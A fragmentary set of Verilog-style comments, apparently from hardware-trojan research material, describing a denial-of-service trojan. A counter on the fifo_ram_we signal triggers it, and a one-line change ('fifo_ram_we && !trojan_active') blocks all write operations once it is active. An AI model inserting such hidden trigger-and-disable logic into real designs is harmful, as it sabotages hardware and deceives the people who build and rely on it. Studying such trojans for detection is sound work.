 ...
 * 
 * Description:
 *   Disables operations by blocking fifo_ram_we control signal
 *   
 * Trigger: Counter on fifo_ram_we
 * Payload: Block fifo_ram_we when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block fifo_ram_we when trojan is active
//
// IMPORTANT: fifo_ram_we is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (fifo_ram_we && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: fifo_ram_we && 0 = 0 (always false)
//   All operations controlled by fifo_ram_we are blocked
